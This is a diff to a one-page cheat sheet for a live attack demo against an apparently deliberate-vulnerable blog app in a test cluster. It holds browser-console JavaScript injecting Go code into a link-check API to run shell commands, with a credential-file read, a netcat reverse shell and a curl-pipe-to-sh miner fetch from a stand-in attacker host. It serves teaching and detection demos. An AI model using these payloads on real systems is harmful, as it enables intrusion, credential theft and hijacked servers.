@@ -7,11 +7,21 @@ One page to memorize. Read it the night before. Keep it next to the laptop. The 
 
 Open `https://blog-unhackable.apps-crc.testing/write` → **F12 → Console** → paste. The `/write` box only
 forwards real links, so the attacker goes around it and POSTs to the API. Same code path, same detections.
+(In [TALK.html](TALK.html) each box has a **Copy** button.)
+
+**Step 1 — show it runs any command** (who am I, what is in my env):
 
 ```js
-const cmd = "id; uname -a; cat ~/.aws/credentials";                                                                // Act 2 RCE
-// const cmd = "nohup nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 & echo '[+] reverse shell launched'"; // Act 4 shell (C2 up)
-// const cmd = "curl -s http://attacker.example.local:8080/stage.sh | sh";                                          // Act 4 miner
+const cmd = "id; env";
+const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString("${btoa(cmd)}"); out, _ := exec.Command("sh", "-c", string(c)).Output(); return string(out) })()`;
+fetch('/api/links/check', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls:[rule]})})
+  .then(r => r.json()).then(d => console.log(d.results[0].detail || d.results[0]));
+```
+
+**Step 2 — later, the reverse shell** (C2 listener up first), or swap `cmd` for the miner `curl -s http://attacker.example.local:8080/stage.sh | sh`:
+
+```js
+const cmd = "nohup nc attacker.example.local 4444 -e /bin/sh >/dev/null 2>&1 & echo '[+] reverse shell launched'";
 const rule = `(func() string { c, _ := base64.StdEncoding.DecodeString("${btoa(cmd)}"); out, _ := exec.Command("sh", "-c", string(c)).Output(); return string(out) })()`;
 fetch('/api/links/check', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls:[rule]})})
   .then(r => r.json()).then(d => console.log(d.results[0].detail || d.results[0]));
